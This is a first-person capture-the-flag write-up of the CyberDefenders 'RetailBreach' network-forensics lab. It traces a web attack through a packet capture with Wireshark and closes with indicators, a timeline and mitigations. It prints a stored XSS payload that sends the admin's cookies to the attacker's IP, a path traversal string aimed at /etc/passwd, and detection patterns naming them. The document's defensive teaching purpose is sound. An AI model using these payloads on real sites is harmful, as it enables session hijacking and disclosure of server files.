# CyberDefenders RetailBreach Writeup

Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/retailbreach/

## Lab Name

**RetailBreach**

## Platform

**CyberDefenders**

## Category

Network Forensics / Web Attack Investigation / PCAP Analysis

## Scenario Summary

In this lab, I acted as a cybersecurity analyst investigating unusual administrative logins on an online retail platform called **ShopSphere**. The suspicious activity happened outside normal working hours, and there were also customer complaints about account anomalies.

The objective of the investigation was to analyze the provided packet capture file and identify how the attacker compromised the web application, stole an administrator session token, and used it to perform unauthorized actions.

The investigation was performed mainly with **Wireshark**, focusing on HTTP traffic, endpoints, HTTP streams, request headers, cookies, timestamps, and suspicious URL parameters.

## Tools Used

- Wireshark
- CyberChef
- PCAP analysis
- HTTP stream analysis
- URL decoding

## Investigation Methodology

The first step in the investigation was to get an overview of the network traffic. I opened the PCAP file in Wireshark and checked the active endpoints using:

```text
Statistics -> Endpoints
```

This helped identify the main IP addresses involved in the communication.

The traffic showed three important IP addresses:

- `73.124.17.52`
- `111.224.180.128`
- `135.143.142.5`

After analyzing the HTTP traffic, I identified `73.124.17.52` as the web server because it was receiving HTTP requests. The IP address `111.224.180.128` was sending multiple suspicious requests to the server, which made it the attacker IP. The remaining IP, `135.143.142.5`, was associated with the administrator/client activity.

The investigation then followed the attacker's activity step by step:

1. Identify the attacker IP.
2. Detect directory brute-forcing activity.
3. Find the XSS payload injected into the web application.
4. Identify when the administrator visited the malicious page.
5. Extract the stolen administrator session token.
6. Analyze how the attacker reused the stolen session.
7. Identify the vulnerable script and path traversal payload.

## Attack Chain Overview

The attack followed this sequence:

1. The attacker enumerated the web application using directory brute-forcing.
2. The attacker discovered a vulnerable page, `reviews.php`.
3. The attacker injected a stored XSS payload into the reviews page.
4. The administrator later visited the infected page.
5. The malicious JavaScript executed in the administrator's browser.
6. The script stole the administrator's session cookie.
7. The attacker reused the stolen session token.
8. The attacker accessed `log_viewer.php`.
9. The attacker exploited a path traversal vulnerability to read `/etc/passwd`.

## Questions and Answers

## Q1. What is the IP address associated with the attacker?

Answer: `111.224.180.128`

### Methodology

To identify the attacker IP address, I first checked the endpoints in Wireshark by going to:

```text
Statistics -> Endpoints
```

This showed three main IP addresses in the capture:

- `73.124.17.52`
- `111.224.180.128`
- `135.143.142.5`

Next, I inspected the HTTP traffic to understand the role of each host.

Useful Wireshark filter:

```text
http
```

The IP address `73.124.17.52` was handling incoming HTTP requests, which indicates that it was the web server. The IP address `111.224.180.128` was sending many requests to the server and later performed suspicious actions such as directory brute-forcing, XSS injection, and path traversal.

Therefore, the attacker IP address is:

```text
111.224.180.128
```

## Q2. Which tool was employed by the attacker to perform directory brute-forcing?

Answer: `gobuster`

### Methodology

Directory brute-forcing is a technique used to discover hidden files and directories on a web server. Attackers often use tools like Gobuster, Dirb, FFUF, or Nikto to automate this process.

To identify the tool used by the attacker, I filtered HTTP requests coming from the attacker IP:

```text
ip.src == 111.224.180.128 and http
```

Then I selected one of the HTTP requests and used:

```text
Follow -> HTTP Stream
```

Inside the HTTP stream, I inspected the request headers, especially the `User-Agent` header.

The User-Agent value showed:

```text
gobuster
```

This indicates that the attacker used Gobuster to brute-force directories on the web application.

## Q3. What XSS payload was utilized by the attacker?

Answer: `<script>fetch('http://111.224.180.128/' + document.cookie);</script>`

### Methodology

Cross-Site Scripting, or XSS, allows an attacker to inject malicious JavaScript into a web page. When another user visits the infected page, the JavaScript executes in that user's browser.

To search for possible XSS payloads, I filtered HTTP traffic from the attacker IP containing the word `script`:

```text
ip.src == 111.224.180.128 and http contains "script"
```

This revealed a suspicious HTTP POST request to:

```text
/reviews.php
```

Since XSS payloads are often submitted through forms, the POST request was highly suspicious.

I followed the HTTP stream of this request and found a URL-encoded JavaScript payload. Since the payload was encoded, I decoded it using CyberChef with the operation:

```text
URL Decode
```

After decoding, the payload was:

```html
<script>fetch('http://111.224.180.128/' + document.cookie);</script>
```

### Explanation

This payload uses JavaScript to send the victim's browser cookies to the attacker-controlled IP address. The important part is:

```javascript
document.cookie
```

This accesses the cookies stored in the victim's browser for the web application. Since the administrator later visited the infected page, the attacker was able to steal the administrator's session cookie.

## Q4. What UTC timestamp shows when the admin user first visited the page containing the injected malicious script?

Answer: `29-03-2024 12:09:50`

### Methodology

After identifying the attacker and server IPs, the remaining relevant IP address was:

```text
135.143.142.5
```

This IP was identified as the administrator/client IP.

To find when the administrator visited the infected `reviews.php` page, I searched for HTTP traffic related to `reviews.php` that did not originate from the attacker:

```text
ip.src != 111.224.180.128 and http contains "reviews.php"
```

This showed two relevant visits to `reviews.php`.

One visit happened before the XSS injection, and another happened after the malicious script had already been injected. The visit after the injection is the important one because that is when the administrator's browser executed the malicious JavaScript.

The relevant packet had the UTC arrival time:

```text
Mar 29, 2024 12:09:50.869688000 UTC
```

Converted to the requested format, the timestamp is:

```text
29-03-2024 12:09:50
```

## Q5. What session token was acquired and used by the attacker for unauthorized access?

Answer: `lqkctf24s9h9lg67teu8uevn3q`

### Methodology

The XSS payload was designed to steal the administrator's cookies using:

```javascript
document.cookie
```

After identifying the administrator's visit to the infected `reviews.php` page, I followed the HTTP stream of that request.

In Wireshark:

```text
Right-click packet -> Follow -> HTTP Stream
```

Inside the HTTP headers, I inspected the `Cookie` header. The administrator's session token was visible there.

The stolen session token was:

```text
lqkctf24s9h9lg67teu8uevn3q
```

### Explanation

A session token is used by a web application to identify an authenticated user. If an attacker steals a valid session token, they may be able to impersonate that user without needing the username or password.

In this case, the attacker used stored XSS to steal the administrator's token and then reused it to gain unauthorized access.

## Q6. What is the name of the script that was exploited by the attacker?

Answer: `log_viewer.php`

### Methodology

After the administrator's session token was stolen, I analyzed the attacker's traffic that occurred after the administrator visited the infected page.

The useful Wireshark filter was:

```text
ip.src == 111.224.180.128 and http and frame.number > 10106
```

This filter shows HTTP requests from the attacker after the administrator's compromised request.

In the later attacker traffic, I observed multiple requests to:

```text
/log_viewer.php
```

One of the requests contained a suspicious parameter:

```text
file=../../../../../etc/passwd
```

This indicates that the attacker exploited the `log_viewer.php` script.

### Explanation

The script `log_viewer.php` appears to accept a file path as input through the `file` parameter. The attacker abused this functionality to attempt a path traversal attack and access files outside the intended web directory.

Therefore, the exploited script was:

```text
log_viewer.php
```

## Q7. What payload was used by the attacker to gain access to a sensitive system file?

Answer: `../../../../../etc/passwd`

### Methodology

After identifying `log_viewer.php` as the exploited script, I inspected the attacker's request to this page.

The suspicious request contained the parameter:

```text
file=../../../../../etc/passwd
```

The payload used by the attacker was:

```text
../../../../../etc/passwd
```

### Explanation

This is a classic path traversal payload.

The sequence:

```text
../
```

means "move one directory up."

By repeating it several times, the attacker attempts to escape the web application directory and access sensitive files on the server filesystem.

The target file was:

```text
/etc/passwd
```

On Linux systems, `/etc/passwd` contains information about local user accounts. While modern systems do not usually store password hashes directly in this file, it is still sensitive because it reveals valid usernames and system account information.

## Indicators of Compromise

| Indicator | Value |
| --- | --- |
| Attacker IP | `111.224.180.128` |
| Web Server IP | `73.124.17.52` |
| Administrator IP | `135.143.142.5` |
| Directory Brute-Force Tool | `gobuster` |
| Vulnerable Page Used for XSS | `reviews.php` |
| XSS Payload | `<script>fetch('http://111.224.180.128/' + document.cookie);</script>` |
| Stolen Session Token | `lqkctf24s9h9lg67teu8uevn3q` |
| Exploited Script | `log_viewer.php` |
| Path Traversal Payload | `../../../../../etc/passwd` |
| Targeted Sensitive File | `/etc/passwd` |

## Timeline of Events

| Step | Event |
| --- | --- |
| 1 | Attacker interacted with the web server |
| 2 | Attacker used Gobuster for directory brute-forcing |
| 3 | Attacker discovered or targeted `reviews.php` |
| 4 | Attacker injected a stored XSS payload into `reviews.php` |
| 5 | Administrator visited the infected page |
| 6 | The XSS payload executed in the administrator's browser |
| 7 | The administrator's session token was sent to the attacker |
| 8 | Attacker reused the stolen session token |
| 9 | Attacker accessed `log_viewer.php` |
| 10 | Attacker exploited path traversal to access `/etc/passwd` |

## Root Cause Analysis

The incident was caused by two main web application vulnerabilities:

### 1. Stored Cross-Site Scripting

The `reviews.php` page allowed user input to be submitted and later rendered without proper sanitization or output encoding. This allowed the attacker to inject JavaScript code that executed when the administrator viewed the page.

### 2. Path Traversal

The `log_viewer.php` script accepted a file path through a parameter and did not properly validate or restrict the requested file. This allowed the attacker to use `../` sequences to move outside the intended directory and access `/etc/passwd`.

## Security Impact

The attack had a serious impact because the attacker was able to steal an administrator's session token. With this token, the attacker could impersonate the administrator and access restricted functionality.

The path traversal vulnerability also allowed the attacker to access sensitive system files. This could lead to further information disclosure and help the attacker continue compromising the server.

## Recommendations

To prevent similar attacks in the future, the following mitigations should be applied:

### Prevent Stored XSS

- Sanitize user input before storing it.
- Encode output before rendering user-controlled data in HTML pages.
- Use a Content Security Policy, also known as CSP.
- Validate input on both client side and server side.
- Avoid directly rendering raw user input.

### Protect Session Cookies

- Set cookies with the `HttpOnly` flag to prevent JavaScript from reading them.
- Set the `Secure` flag so cookies are only sent over HTTPS.
- Use the `SameSite` attribute to reduce cross-site request risks.
- Rotate session tokens after privilege changes or suspicious activity.
- Invalidate sessions after logout or abnormal behavior.

### Prevent Path Traversal

- Do not allow users to directly control file paths.
- Use allowlists for files that can be accessed.
- Normalize and validate paths before using them.
- Restrict file access to a specific safe directory.
- Run the web application with least privilege.
- Avoid exposing sensitive system files through web scripts.

### Improve Detection

- Monitor unusual admin login times.
- Detect abnormal User-Agent values such as `gobuster`.
- Alert on requests containing suspicious patterns like `../`, `/etc/passwd`, or encoded script tags.
- Log and review HTTP POST requests to user-input pages.
- Monitor outbound connections from the server or client to unknown IP addresses.

## Conclusion

The RetailBreach investigation showed a full web attack chain starting with directory brute-forcing and ending with unauthorized access through a stolen administrator session token.

The attacker, using IP address `111.224.180.128`, performed directory brute-forcing with Gobuster and injected a stored XSS payload into `reviews.php`. When the administrator visited the infected page, the malicious JavaScript executed and stole the admin's session cookie. The attacker then reused the stolen token to access privileged functionality and exploited `log_viewer.php` with a path traversal payload to access `/etc/passwd`.

This incident highlights the importance of input validation, output encoding, secure cookie attributes, and strict file access controls in web applications.
